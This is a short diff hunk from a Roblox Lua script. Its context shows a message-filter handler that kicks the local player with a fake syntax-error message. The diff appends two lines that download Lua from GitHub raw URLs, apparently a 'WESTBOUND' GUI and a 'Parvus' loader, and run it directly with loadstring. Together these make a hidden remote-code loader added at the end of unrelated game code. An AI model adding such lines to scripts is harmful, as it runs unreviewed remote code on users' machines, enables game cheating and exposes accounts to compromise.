@@ -245,3 +245,5 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
       game.Players.LocalPlayer:Kick("Error: Expected = on line 60")
   end
 end)
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/WESTBOUND", true))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/AlexR32/Parvus/main/Loader.lua"))()
